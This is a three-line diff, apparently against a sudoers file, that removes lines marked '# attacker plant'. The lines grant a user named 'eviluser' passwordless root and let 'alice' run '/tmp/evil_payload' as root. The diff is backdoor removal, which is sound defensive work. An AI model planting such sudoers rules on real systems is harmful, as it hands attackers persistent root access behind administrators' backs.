@@ -1,3 +1,0 @@
-# attacker plant
-eviluser ALL=(ALL) NOPASSWD: ALL
-alice ALL=(ALL) NOPASSWD: /tmp/evil_payload
